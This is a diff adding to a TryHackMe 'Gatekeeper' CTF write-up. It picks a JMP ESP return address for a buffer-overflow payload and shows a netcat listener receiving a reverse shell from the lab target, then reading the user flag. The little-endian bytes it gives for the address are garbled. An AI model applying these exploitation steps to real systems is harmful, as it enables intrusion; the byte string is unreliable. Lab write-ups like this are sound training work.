@@ -281,6 +281,31 @@ what two locations showed up
 0x080414c3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
 0x080416bf : "\xff\xe4" |  {PAGE_EXECUTE_READ} [gatekeeper] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\TRYHACKME CTF\Gatekeeper\gatekeeper.exe), 0x8000
 ```
+I will now use the first one location of JMP ESP at 0x080414c3 in payload. But that must be in reverse b"\xc3\x14\x04\x80"
 
+## Shellcode based on findings of badchar
 
+```
+└─$ nc -lnvp 8443        
+listening on [any] 8443 ...
+connect to [<attackerIP>] from (UNKNOWN) [TMN_Target] 49237
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\natbat\Desktop>dir
+...
+04/21/2020  05:00 PM             1,197 Firefox.lnk
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+04/21/2020  09:53 PM               135 gatekeeperstart.bat
+05/14/2020  09:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  15,886,802,944 bytes free
+
+C:\Users\natbat\Desktop>type user.txt.txt
+type user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his 
+"dostackbufferoverflowgood" program.  Thank you!
+C:\Users\natbat\Desktop>
 ```
